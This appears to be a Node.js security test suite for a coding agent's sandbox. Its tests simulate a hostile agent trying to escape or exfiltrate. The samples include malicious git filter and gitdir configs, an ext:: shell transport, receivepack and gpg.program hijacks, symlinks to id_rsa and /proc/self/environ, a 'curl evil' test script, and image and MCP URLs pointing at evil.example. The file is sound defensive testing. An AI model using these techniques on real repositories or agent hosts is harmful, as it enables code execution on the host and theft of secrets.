// The starter agent's walls against a hostile agent, one test per finding of
// the PR #26 security review: host git never trusts the mount, the egress
// proxy checks the TLS name, CI files are not pushed, one model call at a
// time with the prompt reserved, remote images stripped, results checked,
// run_tests needs approval after the agent changed what it runs, the gate's
// @agent tag must be newer than the last edit, and IPv6 forms of private
// addresses are private.
import { after, test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import http from 'node:http'
import net from 'node:net'
import path from 'node:path'
import tls from 'node:tls'
import { loadConfig } from '../src/config.js'
import { createComment, updateComment, getComment } from '../src/store.js'
import { createEgressProxy, privateAddress, readClientHello } from '../src/agent/starter/egress-proxy.js'
import { gateComment } from '../src/agent/starter/gate.js'
import { createModelRelay } from '../src/agent/starter/model-relay.js'
import { guardedFiles, isGuarded } from '../src/agent/starter/push-guard.js'
import { containerResult, outcomeReply } from '../src/agent/starter/supervisor.js'
import { starterSettings, validateStarterAgent } from '../src/agent/starter/settings.js'
import { sweepLeftovers } from '../src/agent/starter/sweep.js'
import { createTools } from '../src/agent/starter/tools.js'
import {
  commitWorktree,
  createWorktree,
  git,
  linkLeaves,
  newRunId,
  pushBranch,
  readEntry,
  sweepWorkRoot,
} from '../src/agent/starter/worktree.js'
import { tempDir } from './helpers.js'
import { startStarterStub } from './fixtures/starter-model-stub.mjs'

const gitIn = (dir, ...args) =>
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', '-c', 'commit.gpgSign=false', ...args], {
    cwd: dir,
    stdio: 'pipe',
  }).toString()

const closers = []
after(async () => {
  for (const close of closers) await close()
})

function repo(name) {
  const dir = fs.realpathSync(tempDir(name))
  gitIn(dir, 'init', '-q', '-b', 'main')
  fs.mkdirSync(path.join(dir, 'src'))
  fs.writeFileSync(path.join(dir, 'src', 'hero.html'), '<h1>Welcome</h1>\n')
  fs.writeFileSync(path.join(dir, '.gitattributes'), '*.html text\n')
  fs.writeFileSync(path.join(dir, '.gitignore'), 'dist/\n')
  gitIn(dir, 'add', '-A')
  gitIn(dir, 'commit', '-q', '-m', 'init')
  return dir
}

async function checkout(name) {
  const dir = repo(name)
  const root = fs.realpathSync(tempDir(`${name}-runs`))
  const runId = newRunId()
  const tree = await createWorktree({ projectDir: dir, root, runId, branch: `shapewall-agent/site-1-${runId.split('-')[1]}` })
  return { dir, root, tree }
}

// ---- 1. Host git never trusts the mount ------------------------------------------------

test('the mount is a plain checkout: no .git, the branch only appears at commit time', async () => {
  const { dir, tree } = await checkout('sec-checkout')
  assert.equal(fs.existsSync(path.join(tree.dir, '.git')), false)
  assert.equal(fs.readFileSync(path.join(tree.dir, 'src', 'hero.html'), 'utf8'), '<h1>Welcome</h1>\n')
  assert.equal(gitIn(dir, 'branch', '--list', tree.branch).trim(), '', 'no branch before a commit')
  assert.equal(gitIn(dir, 'worktree', 'list').trim().split('\n').length, 1, 'not a git worktree')
})

test('from a linked worktree, the base is that worktree HEAD, not main', async () => {
  const dir = repo('sec-linked')
  const linked = path.join(fs.realpathSync(tempDir('sec-linked-wt')), 'wt')
  gitIn(dir, 'worktree', 'add', '-q', '-b', 'feature', linked)
  fs.writeFileSync(path.join(linked, 'src', 'hero.html'), '<h1>Feature</h1>\n')
  gitIn(linked, 'commit', '-q', '-am', 'feature')
  const feature = gitIn(linked, 'rev-parse', 'HEAD').trim()
  assert.notEqual(feature, gitIn(dir, 'rev-parse', 'main').trim())
  const root = fs.realpathSync(tempDir('sec-linked-runs'))
  const runId = newRunId()
  const tree = await createWorktree({ projectDir: linked, root, runId, branch: `shapewall-agent/site-1-${runId.split('-')[1]}` })
  assert.equal(tree.base, feature)
  assert.equal(fs.readFileSync(path.join(tree.dir, 'src', 'hero.html'), 'utf8'), '<h1>Feature</h1>\n')
  fs.writeFileSync(path.join(tree.dir, 'src', 'hero.html'), '<h1>Agent</h1>\n')
  await commitWorktree({ tree, message: 'x\n' })
  assert.equal(gitIn(dir, 'rev-parse', `${tree.branch}^`).trim(), feature, 'the branch grows from the worktree HEAD')
})

test('a .git file, attributes and filters the agent wrote never run on the host or move main', async () => {
  const { dir, tree } = await checkout('sec-git')
  const marker = path.join(tree.root, 'PWNED')
  const mainBefore = gitIn(dir, 'rev-parse', 'main').trim()
  // A filter in the person's own repo config (think git-lfs): attributes from the agent must not invoke it.
  gitIn(dir, 'config', 'filter.p.clean', `sh -c 'touch ${marker}; cat'`)
  // The review's reproduction: a gitdir of the agent's with a filter in its config...
  fs.mkdirSync(path.join(tree.dir, '.evil'))
  fs.writeFileSync(
    path.join(tree.dir, '.evil', 'config'),
    `[core]\n\trepositoryformatversion = 0\n[filter "p"]\n\tclean = sh -c 'touch ${marker}; cat'\n`,
  )
  fs.writeFileSync(path.join(tree.dir, '.git'), 'gitdir: .evil\n')
  fs.writeFileSync(path.join(tree.dir, '.gitattributes'), '* filter=p\n')
  fs.writeFileSync(path.join(tree.dir, 'src', 'hero.html'), '<h1>Hello</h1>\n')
  const made = await commitWorktree({ tree, message: 'agent change\n' })
  assert.equal(fs.existsSync(marker), false, 'no filter ran')
  assert.equal(made.committed, true)
  assert.equal(gitIn(dir, 'rev-parse', 'main').trim(), mainBefore, 'main did not move')
  assert.equal(gitIn(dir, 'show', `${tree.branch}:src/hero.html`), '<h1>Hello</h1>\n')
  assert.equal(gitIn(dir, 'show', `${tree.branch}:.gitattributes`), '*.html text\n', '.gitattributes keeps the base')
  const files = gitIn(dir, 'ls-tree', '-r', '--name-only', tree.branch).trim().split('\n')
  assert.ok(!files.includes('.git'), 'never a .git entry')
  assert.equal(gitIn(dir, 'log', '-1', '--format=%an %P', tree.branch).trim(), `Shapewall starter agent ${mainBefore}`)

  // ...and a .git pointing at the main repository's gitdir: still nothing lands on main.
  const second = await checkout('sec-git-main')
  fs.writeFileSync(path.join(second.tree.dir, '.git'), `gitdir: ${path.join(second.dir, '.git')}\n`)
  fs.writeFileSync(path.join(second.tree.dir, 'src', 'hero.html'), '<h1>Again</h1>\n')
  const mainSecond = gitIn(second.dir, 'rev-parse', 'main').trim()
  await commitWorktree({ tree: second.tree, message: 'x\n' })
  assert.equal(gitIn(second.dir, 'rev-parse', 'main').trim(), mainSecond)
  assert.equal(gitIn(second.dir, 'show', 'main:src/hero.html'), '<h1>Welcome</h1>\n')
})

test('symlinks are committed as links, never followed; hard links and an existing branch are refused', async () => {
  const { dir, tree } = await checkout('sec-links')
  const outside = fs.realpathSync(tempDir('sec-outside'))
  fs.writeFileSync(path.join(outside, 'hero.html'), 'SECRET-OUTSIDE\n')
  fs.writeFileSync(path.join(outside, 'id_rsa'), 'SECRET-KEY\n')
  // A tracked folder swapped for a link to the host, a linked file, and a hard link.
  fs.rmSync(path.join(tree.dir, 'src'), { recursive: true })
  fs.symlinkSync(outside, path.join(tree.dir, 'src'))
  fs.symlinkSync(path.join(outside, 'id_rsa'), path.join(tree.dir, 'leak.txt'))
  fs.linkSync(path.join(outside, 'id_rsa'), path.join(tree.dir, 'hard.txt'))
  const made = await commitWorktree({ tree, message: 'links\n' })
  assert.deepEqual(
    made.refused.map((item) => [item.path, item.reason]),
    [['hard.txt', 'a hard link']],
  )
  const listing = gitIn(dir, 'ls-tree', '-r', tree.branch)
  assert.match(listing, /^120000 blob \S+\tleak\.txt$/m)
  assert.match(listing, /^120000 blob \S+\tsrc$/m)
  assert.doesNotMatch(listing, /hard\.txt|src\/hero\.html/)
  const blobs = gitIn(dir, 'rev-list', '--objects', tree.branch)
  for (const line of blobs.trim().split('\n')) {
    const oid = line.split(' ')[0]
    if (gitIn(dir, 'cat-file', '-t', oid).trim() !== 'blob') continue
    assert.doesNotMatch(gitIn(dir, 'cat-file', '-p', oid), /SECRET/)
  }
  assert.equal(readEntry(tree.dir, 'src/hero.html').kind, 'missing', 'a path through a link is not read')
  // The branch exists now: a second commit on the same run, or a new checkout for it, is refused.
  await assert.rejects(commitWorktree({ tree, message: 'again\n' }), /update-ref|exists|reference/)
  await assert.rejects(createWorktree({ projectDir: dir, root: tree.root, runId: newRunId(), branch: tree.branch }), /exists already/)
})

test('a checkout that fails leaves no folder and no owner file behind', async () => {
  const dir = repo('sec-failed-checkout')
  const root = fs.realpathSync(tempDir('sec-failed-checkout-runs'))
  const runId = newRunId()
  // A blob of the commit is missing from the object store: the checkout
  // fails after the folder was made and other files were written.
  const oid = gitIn(dir, 'rev-parse', 'HEAD:src/hero.html').trim()
  fs.rmSync(path.join(dir, '.git', 'objects', oid.slice(0, 2), oid.slice(2)), { force: true })
  await assert.rejects(createWorktree({ projectDir: dir, root, runId, branch: `shapewall-agent/site-1-${runId.split('-')[1]}` }))
  assert.equal(fs.existsSync(path.join(root, runId)), false, 'no checkout folder')
  assert.equal(fs.existsSync(path.join(root, `${runId}.owner`)), false, 'no owner file')
})

test('host git is found on absolute PATH entries only, never in the folder it runs in', async () => {
  const folder = fs.realpathSync(tempDir('sec-fake-git'))
  const marker = path.join(folder, 'RAN')
  fs.writeFileSync(path.join(folder, 'git'), `#!/bin/sh\ntouch ${marker}\necho fake\n`, { mode: 0o755 })
  const out = await git(['--version'], { cwd: folder, env: { ...process.env, PATH: `.:${process.env.PATH}` } })
  assert.match(out, /^git version/)
  assert.equal(fs.existsSync(marker), false, 'the folder git never ran')
  await assert.rejects(git(['--version'], { cwd: folder, env: { PATH: '.' } }), /not found/)
})

test('the startup sweep removes only what dead runs left', async () => {
  const root = fs.realpathSync(tempDir('sec-sweep'))
  const dead = '20260101000000-aaaaaa'
  const live = '20260101000000-bbbbbb'
  const old = '20260101000000-cccccc'
  for (const name of [dead, live, old]) fs.mkdirSync(path.join(root, name, 'sub'), { recursive: true })
  fs.writeFileSync(path.join(root, `${dead}.owner`), '999999\n')
  fs.writeFileSync(path.join(root, `${live}.owner`), `${process.pid}\n`)
  const day = Date.now() + 2 * 24 * 60 * 60 * 1000
  const isAlive = (pid) => pid === process.pid
  assert.deepEqual(sweepWorkRoot(root, { isAlive }).sort(), [dead])
  assert.deepEqual(sweepWorkRoot(root, { isAlive, now: day }), [old], 'no owner file: removed once a day old')
  assert.ok(fs.existsSync(path.join(root, live)))

  const removed = []
  const runtime = {
    async exec(args) {
      if (args[0] === 'ps') return { code: 0, stdout: `shapewall-agent-${dead}\nshapewall-egress-${live}\nsomething-else\n`, stderr: '' }
      if (args[0] === 'network' && args[1] === 'ls') return { code: 0, stdout: `shapewall-agent-${dead}\n`, stderr: '' }
      if (args[0] === 'inspect' || (args[0] === 'network' && args[1] === 'inspect')) {
        return { code: 0, stdout: args.at(-1).includes(live) ? `${process.pid}\n` : '999999\n', stderr: '' }
      }
      removed.push(args.join(' '))
      return { code: 0, stdout: '', stderr: '' }
    },
  }
  const result = await sweepLeftovers({ runtime, root: null, isAlive })
  assert.deepEqual(result.containers, [`shapewall-agent-${dead}`])
  assert.deepEqual(result.networks, [`shapewall-agent-${dead}`])
  assert.deepEqual(removed, [`rm -f shapewall-agent-${dead}`, `network rm shapewall-agent-${dead}`])
})

// ---- 2. Egress: the TLS name must be the allowed host --------------------------------

async function proxyWithUpstream() {
  const received = []
  const upstream = net.createServer((socket) => {
    socket.on('data', (chunk) => received.push(chunk))
    socket.on('error', () => {})
  })
  await new Promise((resolve) => upstream.listen(0, '127.0.0.1', resolve))
  const port = upstream.address().port
  const log = []
  const proxy = createEgressProxy({
    allow: [{ host: 'registry.example', port, private: true }],
    log: (entry) => log.push(entry),
    lookup: async () => ({ address: '127.0.0.1' }),
  })
  await new Promise((resolve) => proxy.listen(0, '127.0.0.1', resolve))
  closers.push(() => new Promise((resolve) => proxy.close(resolve)))
  closers.push(() => new Promise((resolve) => upstream.close(resolve)))
  return { proxyPort: proxy.address().port, port, received, log }
}

function tunnel(proxyPort, target, send) {
  return new Promise((resolve) => {
    const req = http.request({ host: '127.0.0.1', port: proxyPort, method: 'CONNECT', path: target, agent: false })
    req.once('connect', (res, socket) => {
      socket.on('error', () => {})
      socket.once('close', () => resolve({ status: res.statusCode, closed: true }))
      send(socket)
      setTimeout(() => {
        socket.destroy()
        resolve({ status: res.statusCode, closed: false })
      }, 1500)
    })
    req.once('error', () => resolve({ status: null }))
    req.end()
  })
}

test('CONNECT carries only TLS whose server name is the allowed host', async () => {
  const { proxyPort, port, received, log } = await proxyWithUpstream()
  const target = `registry.example:${port}`
  const hello = (servername) => (socket) => {
    const secure = tls.connect({ socket, servername, rejectUnauthorized: false })
    secure.on('error', () => {})
  }
  // Another name on the same address (a shared CDN): refused, nothing reaches the upstream.
  const wrong = await tunnel(proxyPort, target, hello('evil.example'))
  assert.equal(wrong.closed, true)
  assert.equal(received.length, 0)
  assert.ok(log.some((entry) => entry.deny && /TLS server name "evil.example"/.test(entry.reason)))
  // No server name, and plain bytes: refused.
  await tunnel(proxyPort, target, hello(''))
  assert.ok(log.some((entry) => entry.deny && /missing/.test(entry.reason)))
  await tunnel(proxyPort, target, (socket) => socket.write('GET / HTTP/1.1\r\nHost: evil.example\r\n\r\n'))
  assert.ok(log.some((entry) => entry.deny && /not TLS/.test(entry.reason)))
  assert.equal(received.length, 0)
  // The allowed name: the ClientHello goes through.
  await tunnel(proxyPort, target, hello('registry.example'))
  assert.ok(received.length > 0)
  assert.equal(received[0][0], 0x16, 'the upstream got the TLS handshake')
})

// A minimal ClientHello with the given extensions ([type, Buffer]).
function clientHello(extensions) {
  const ext = Buffer.concat(
    extensions.map(([type, data]) => {
      const head = Buffer.alloc(4)
      head.writeUInt16BE(type, 0)
      head.writeUInt16BE(data.length, 2)
      return Buffer.concat([head, data])
    }),
  )
  const extLength = Buffer.alloc(2)
  extLength.writeUInt16BE(ext.length)
  const body = Buffer.concat([
    Buffer.from([3, 3]),
    Buffer.alloc(32),
    Buffer.from([0]),
    Buffer.from([0, 2, 0x13, 0x01]),
    Buffer.from([1, 0]),
    extLength,
    ext,
  ])
  const handshake = Buffer.concat([Buffer.from([1, 0, body.length >> 8, body.length & 255]), body])
  return Buffer.concat([Buffer.from([0x16, 3, 1, handshake.length >> 8, handshake.length & 255]), handshake])
}
const sniExt = (name) => {
  const host = Buffer.from(name)
  const entry = Buffer.concat([Buffer.from([0, host.length >> 8, host.length & 255]), host])
  return [0, Buffer.concat([Buffer.from([entry.length >> 8, entry.length & 255]), entry])]
}

test('the ClientHello reader: server name, ECH, pieces, two names', () => {
  const full = clientHello([sniExt('Registry.Example')])
  assert.deepEqual(readClientHello(full), { sni: 'registry.example', ech: false })
  assert.deepEqual(readClientHello(full.subarray(0, 20)), { need: true })
  assert.equal(readClientHello(clientHello([sniExt('a.example'), [0xfe0d, Buffer.from([0])]])).ech, true)
  assert.match(readClientHello(clientHello([sniExt('a.example'), sniExt('b.example')])).error, /two/)
  assert.equal(readClientHello(Buffer.from('GET / HTTP/1.1\r\n\r\n')).error, 'not TLS')
})

test('IPv6 forms of private IPv4 addresses are private', () => {
  for (const address of [
    '::ffff:7f00:1',
    '::ffff:127.0.0.1',
    '::ffff:a00:1',
    '64:ff9b::a00:1',
    '64:ff9b::7f00:1',
    '64:ff9b:1::1',
    '2002:c0a8:101::',
    '::1',
    '::',
    'fe80::1',
    'fd00::1',
    '2001::1',
  ]) {
    assert.equal(privateAddress(address), true, address)
  }
  for (const address of ['64:ff9b::808:808', '2606:4700::1111', '::ffff:8.8.8.8', '8.8.8.8'])
    assert.equal(privateAddress(address), false, address)
})

// ---- 3. No push of CI config or manifests by default ---------------------------------

test('the push guard knows CI config, manifests and build files', () => {
  for (const file of [
    '.github/workflows/ci.yml',
    'pkg/.github/x.yml',
    '.gitlab-ci.yml',
    'package.json',
    'web/package-lock.json',
    'requirements-dev.txt',
    'Makefile',
    'Dockerfile.prod',
    'build.gradle.kts',
    '.husky/pre-push',
  ]) {
    assert.ok(isGuarded(file), file)
  }
  assert.deepEqual(guardedFiles(['src/hero.html', 'README.md', 'docs/package.md']), [])
})

// ---- 4. One model call at a time, prompt reserved, no remote images ------------------

test('the relay takes one call at a time, reserves the prompt and strips remote images', async () => {
  const stub = await startStarterStub({ script: [{ text: 'one' }, { text: 'two' }] })
  closers.push(() => stub.close())
  const settings = { model: { baseUrl: `http://127.0.0.1:${stub.port}/v1`, model: 'm', keyVar: null, maxTokens: 4096, temperature: null } }
  const sent = []
  const relay = createModelRelay({ settings, env: {}, budget: { turns: 10, tokens: 100000 }, send: (message) => sent.push(message) })
  const content = [
    { type: 'text', text: 'look' },
    { type: 'image_url', image_url: { url: 'https://evil.example/leak?secret=1' } },
    { type: 'image_url', image_url: { url: 'data:image/png;base64,iVBORw0KGgo=' } },
    { type: 'input_audio', input_audio: { data: 'x' } },
  ]
  const body = { messages: [{ role: 'user', content, extra: 'dropped' }] }
  await Promise.all([1, 2, 3].map((id) => relay.handle({ t: 'call', id, method: 'model', params: { body } })))
  assert.equal(stub.calls.length, 1, 'only one call in flight reached the model')
  assert.deepEqual(
    sent.filter((message) => message.t === 'head' && message.status === 429).map((message) => message.id),
    [2, 3],
  )
  const relayed = JSON.stringify(stub.calls[0].body.messages)
  assert.doesNotMatch(relayed, /evil\.example|input_audio|extra/)
  assert.match(relayed, /data:image\/png;base64/)
  // A prompt bigger than what is left is refused before it is sent.
  const small = createModelRelay({ settings, env: {}, budget: { turns: 10, tokens: 50 }, send: () => {} })
  await small.handle({ t: 'call', id: 1, method: 'model', params: { body: { messages: [{ role: 'user', content: 'x'.repeat(400) }] } } })
  assert.equal(small.stop, 'tokens')
  assert.equal(stub.calls.length, 1)
})

test('the relay passes only function tools, never provider-side ones', async () => {
  const stub = await startStarterStub({ script: [{ text: 'one' }] })
  closers.push(() => stub.close())
  const settings = { model: { baseUrl: `http://127.0.0.1:${stub.port}/v1`, model: 'm', keyVar: null, maxTokens: 64, temperature: null } }
  const relay = createModelRelay({ settings, env: {}, budget: { turns: 5, tokens: 100000 }, send: () => {} })
  const tools = [
    { type: 'function', function: { name: 'read_file', description: 'Read', parameters: { type: 'object' } }, extra: 1 },
    { type: 'web_search' },
    { type: 'web_search_preview', search_context_size: 'high' },
    { type: 'browser' },
    { type: 'code_interpreter', container: { type: 'auto' } },
    { type: 'function', function: { name: 'bad name!' } },
    { type: 'mcp', server_url: 'https://evil.example' },
  ]
  await relay.handle({ t: 'call', id: 1, method: 'model', params: { body: { messages: [{ role: 'user', content: 'hi' }], tools } } })
  assert.deepEqual(stub.calls[0].body.tools, [
    { type: 'function', function: { name: 'read_file', description: 'Read', parameters: { type: 'object' } } },
  ])
})

test('the disk watch measures the folder and stops over the limit', async () => {
  const { folderBytes, watchDisk } = await import('../src/agent/starter/disk.js')
  const dir = fs.realpathSync(tempDir('sec-disk'))
  fs.writeFileSync(path.join(dir, 'a.bin'), Buffer.alloc(2 * 1024 * 1024, 1))
  fs.symlinkSync('/usr', path.join(dir, 'usr'))
  const bytes = await folderBytes(dir)
  assert.ok(bytes >= 2 * 1024 * 1024 && bytes < 3 * 1024 * 1024, `${bytes} bytes (the /usr link is not followed)`)
  const over = await new Promise((resolve) => watchDisk({ dir, limitBytes: 1024 * 1024, everyMs: 10, onOver: resolve }))
  assert.equal(over.limit, 1024 * 1024)
  assert.ok(over.bytes > over.limit)
})

test('the container result is checked field by field', () => {
  const result = containerResult({
    stop: 'answered',
    text: 'ok',
    status: 'done',
    usage: { tokens: 0 },
    changed: ['x'],
    error: { message: 5 },
    extra: 1,
  })
  assert.deepEqual(result, { stop: 'answered', text: 'ok', status: 'done', statusNote: null, error: { message: 'error' }, setup: null })
  assert.equal(containerResult({ stop: 'rm -rf', status: 'merged', text: {} }).stop, 'crashed')
  assert.equal(containerResult({ status: 'merged' }).status, null)
})

// ---- 5. run_tests after the agent changed what it runs --------------------------------

test('run_tests needs approval once the agent changed what the test command runs', async () => {
  const root = fs.realpathSync(tempDir('sec-tests'))
  fs.writeFileSync(path.join(root, 'package.json'), '{}\n')
  const asked = []
  const make = ({ shell, approve }) =>
    createTools({
      root,
      shell,
      testCommand: ['node', '-e', 'process.exit(0)'],
      rpc: {
        call: async (method, params) => {
          asked.push([method, params])
          return { approved: approve }
        },
      },
      remainingMs: () => 60000,
    })
  // Unchanged inputs: runs without asking.
  let tools = make({ shell: false, approve: false })
  assert.equal((await tools.run({ name: 'run_tests', args: {} })).ok, true)
  assert.equal(asked.length, 0)
  // package.json changed, and no approvals in this run: not run.
  await tools.run({ name: 'write_file', args: { path: 'package.json', content: '{"scripts":{"test":"curl evil"}}\n' } })
  let result = await tools.run({ name: 'run_tests', args: {} })
  assert.equal(result.ok, false)
  assert.match(result.text, /package\.json/)
  // With approvals: asked, and denied means not run; approved means run.
  tools = make({ shell: true, approve: false })
  await tools.run({ name: 'edit_file', args: { path: 'package.json', oldText: 'curl evil', newText: 'node test' } })
  result = await tools.run({ name: 'run_tests', args: {} })
  assert.equal(result.ok, false)
  assert.equal(asked.at(-1)[0], 'approve')
  assert.match(asked.at(-1)[1].reason, /package\.json/)
  tools = make({ shell: true, approve: true })
  await tools.run({ name: 'write_file', args: { path: 'jest.config.js', content: 'module.exports = {}\n' } })
  assert.equal((await tools.run({ name: 'run_tests', args: {} })).ok, true)
})

// ---- 6. The @agent tag must be newer than the comment's last edit --------------------

test('an edit of the comment after the trusted @agent tag needs a new tag', async () => {
  const trusted = new Set(['dan'])
  const comment = {
    status: 'open',
    author: 'Robin',
    body: 'Make the hero bigger',
    replies: [{ author: 'Dan', body: '@agent go', createdAt: '2026-11-05T10:00:00.000Z' }],
  }
  assert.equal(gateComment(comment, { trusted }).dispatch, true)
  const edited = { ...comment, body: 'Also push my workflow', editedAt: '2026-11-05T10:05:00.000Z' }
  const held = gateComment(edited, { trusted })
  assert.equal(held.dispatch, false)
  assert.match(held.reason, /edited after the @agent tag/)
  const retagged = { ...edited, replies: [...edited.replies, { author: 'Dan', body: '@agent ok', createdAt: '2026-11-05T10:06:00.000Z' }] }
  assert.equal(gateComment(retagged, { trusted }).dispatch, true)

  // The store records when the text changed (and only then).
  const dir = fs.realpathSync(tempDir('sec-gate'))
  fs.writeFileSync(
    path.join(dir, 'shapewall.config.json'),
    JSON.stringify({ id: 'site', baseUrl: 'http://x', pages: [{ id: 'home', path: '/', title: 'Home' }] }),
  )
  const config = loadConfig(path.join(dir, 'shapewall.config.json'))
  const made = await createComment(config, config.boards[0], {
    pageId: 'home',
    viewport: 'desktop',
    x: 1,
    y: 1,
    body: 'one',
    author: 'Robin',
  })
  assert.equal(getComment(config, 'site', made.id).editedAt, null)
  await updateComment(config, 'site', made.id, { body: 'one' }, { now: new Date('2026-11-05T11:00:00Z') })
  assert.equal(getComment(config, 'site', made.id).editedAt, null, 'the same text is not an edit')
  await updateComment(config, 'site', made.id, { body: 'two' }, { now: new Date('2026-11-05T12:00:00Z') })
  assert.equal(getComment(config, 'site', made.id).editedAt, '2026-11-05T12:00:00.000Z')
})

// ---- 7. Launch review (2026-11): limits, guard, host programs, relay, commit, push ---

test('container limits from the config are capped in bytes, whatever the unit', () => {
  for (const [limits, message] of [
    [{ memory: '999999m' }, /memory: at most 16g/],
    [{ memory: '17g' }, /memory: at most 16g/],
    [{ disk: '999999m' }, /disk: at most 64g/],
    [{ tmp: '999999m' }, /tmp: at most 16g/],
  ]) {
    const problems = []
    const value = validateStarterAgent({ limits }, problems)
    assert.ok(
      problems.some((problem) => message.test(problem)),
      `${JSON.stringify(limits)}: ${problems.join('; ')}`,
    )
    assert.equal(value.limits.memory, '4g', 'the defaults stay')
  }
  const problems = []
  assert.equal(validateStarterAgent({ limits: { memory: '8192m', disk: '10g' } }, problems).limits.memory, '8192m')
  assert.deepEqual(problems, [])
  const config = { starterAgent: validateStarterAgent({}, []), agent: null, boards: [] }
  assert.throws(() => starterSettings(config, { env: {}, flags: { 'max-disk': '999999m' } }), /max-disk/)
})

test('the push guard knows package manager wrappers and plugins that CI runs', () => {
  for (const file of [
    '.yarn/releases/yarn-4.5.0.cjs',
    '.yarn/plugins/x.cjs',
    '.pnpmfile.cjs',
    '.mvn/extensions.xml',
    'mvnw',
    'gradlew',
    'gradle/wrapper/gradle-wrapper.properties',
    'gradle/libs.versions.toml',
    '.cargo/config.toml',
    'action.yml',
    'deno.json',
    'CMakeLists.txt',
    'flake.nix',
  ]) {
    assert.ok(isGuarded(file), file)
  }
  assert.deepEqual(guardedFiles(['src/gradle.js', 'docs/yarn.md']), [])
})

test('the disk measure runs du from absolute PATH entries only', async () => {
  const { folderBytes } = await import('../src/agent/starter/disk.js')
  const folder = fs.realpathSync(tempDir('sec-fake-du'))
  const marker = path.join(folder, 'RAN')
  fs.writeFileSync(path.join(folder, 'du'), `#!/bin/sh\ntouch ${marker}\necho 1 .\n`, { mode: 0o755 })
  const cwd = process.cwd()
  process.chdir(folder)
  try {
    assert.equal(await folderBytes(folder, { env: { PATH: '.' } }), null)
    assert.equal(fs.existsSync(marker), false, 'the folder du never ran')
    assert.ok((await folderBytes(folder, { env: { PATH: `.:${process.env.PATH}` } })) > 0)
    assert.equal(fs.existsSync(marker), false)
  } finally {
    process.chdir(cwd)
  }
})

test('the relay passes earlier tool calls as function calls only', async () => {
  const stub = await startStarterStub({ script: [{ text: 'one' }] })
  closers.push(() => stub.close())
  const settings = { model: { baseUrl: `http://127.0.0.1:${stub.port}/v1`, model: 'm', keyVar: null, maxTokens: 64, temperature: null } }
  const relay = createModelRelay({ settings, env: {}, budget: { turns: 5, tokens: 100000 }, send: () => {} })
  const messages = [
    { role: 'user', content: 'hi' },
    {
      role: 'assistant',
      content: null,
      tool_calls: [
        { id: 'c1', type: 'function', function: { name: 'read_file', arguments: '{"path":"a"}', extra: 1 }, extra: 2 },
        { id: 'c2', type: 'web_search_call', action: { query: 'leak' } },
        { id: 'c3', type: 'mcp_call', server_url: 'https://evil.example' },
      ],
    },
    { role: 'tool', tool_call_id: 'c1', content: 'text' },
  ]
  await relay.handle({ t: 'call', id: 1, method: 'model', params: { body: { messages } } })
  assert.deepEqual(stub.calls[0].body.messages[1].tool_calls, [
    { id: 'c1', type: 'function', function: { name: 'read_file', arguments: '{"path":"a"}' } },
  ])
})

test('a commit reads at most its byte budget and calls out symlinks that leave the repo', async () => {
  const { tree } = await checkout('sec-commit-cap')
  // Sparse: du sees almost nothing, but reading them in is the whole size.
  for (const name of ['a.bin', 'b.bin', 'c.bin']) fs.truncateSync(fs.openSync(path.join(tree.dir, name), 'w'), 40 * 1024 * 1024)
  fs.symlinkSync('/proc/self/environ', path.join(tree.dir, 'src', 'env.txt'))
  fs.symlinkSync('../../outside', path.join(tree.dir, 'src', 'up'))
  fs.symlinkSync('hero.html', path.join(tree.dir, 'src', 'same.html'))
  const made = await commitWorktree({ tree, message: 'cap\n', maxBytes: 50 * 1024 * 1024 })
  assert.deepEqual(
    made.refused.map((item) => [item.path, item.reason]),
    [
      ['b.bin', "over the run's size limit"],
      ['c.bin', "over the run's size limit"],
    ],
  )
  assert.ok(made.files.includes('a.bin'))
  assert.deepEqual(made.links, ['src/env.txt', 'src/up'])
  assert.equal(linkLeaves('a/b', '../c'), false)
  assert.equal(linkLeaves('a/b', '../../c'), true)
  assert.equal(linkLeaves('b', '/etc/passwd'), true)
  const reply = outcomeReply({
    result: { stop: 'answered', text: 'x', usage: { turns: 1, tokens: 1 } },
    status: 'done',
    branch: tree.branch,
    commit: made,
    pr: null,
    budget: { turns: 20, tokens: 200000, minutes: 15 },
    ms: 1000,
    blocked: [],
  })
  assert.match(reply, /symlinks that point outside the repository: src\/env\.txt, src\/up/)
})

test('the push runs no program the repository config names: receivepack, ext:: transport, signing', async () => {
  const { dir, tree } = await checkout('sec-push-config')
  const bare = fs.realpathSync(tempDir('sec-push-config-remote'))
  const marker = path.join(fs.realpathSync(tempDir('sec-push-marker')), 'ran')
  const script = path.join(path.dirname(marker), 'run.sh')
  fs.writeFileSync(script, `#!/bin/sh\ntouch "${marker}"\nexec git-receive-pack "$@"\n`, { mode: 0o755 })
  gitIn(bare, 'init', '-q', '--bare')
  gitIn(dir, 'remote', 'add', 'origin', bare)
  gitIn(dir, 'config', 'remote.origin.receivepack', script)
  gitIn(dir, 'config', 'push.gpgSign', 'true')
  gitIn(dir, 'config', 'gpg.program', script)
  fs.writeFileSync(path.join(tree.dir, 'src', 'hero.html'), '<h1>Pushed safely</h1>\n')
  await commitWorktree({ tree, message: 'push\n' })
  await pushBranch({ tree, remote: 'origin' })
  assert.equal(fs.existsSync(marker), false, 'neither the configured receive program nor the gpg program ran')
  assert.deepEqual(gitIn(bare, 'for-each-ref', '--format=%(refname)').trim().split('\n'), [`refs/heads/${tree.branch}`])

  // A remote whose URL is a command, with that transport allowed in the config.
  gitIn(dir, 'remote', 'add', 'evil', `ext::sh -c touch% ${marker}`)
  gitIn(dir, 'config', 'protocol.ext.allow', 'always')
  await assert.rejects(pushBranch({ tree, remote: 'evil' }))
  assert.equal(fs.existsSync(marker), false, 'the ext:: transport did not run')
  await assert.rejects(pushBranch({ tree, remote: '--receive-pack=' + script }), /not a remote name/)
})

test('the push sends the branch only: no tags from push.followTags', async () => {
  const { dir, tree } = await checkout('sec-push')
  const bare = fs.realpathSync(tempDir('sec-push-remote'))
  gitIn(bare, 'init', '-q', '--bare')
  gitIn(dir, 'remote', 'add', 'origin', bare)
  gitIn(dir, 'tag', '-a', 'v-secret', '-m', 'internal release')
  gitIn(dir, 'config', 'push.followTags', 'true')
  fs.writeFileSync(path.join(tree.dir, 'src', 'hero.html'), '<h1>Pushed</h1>\n')
  await commitWorktree({ tree, message: 'push\n' })
  await pushBranch({ tree, remote: 'origin' })
  const refs = gitIn(bare, 'for-each-ref', '--format=%(refname)').trim().split('\n')
  assert.deepEqual(refs, [`refs/heads/${tree.branch}`])
})
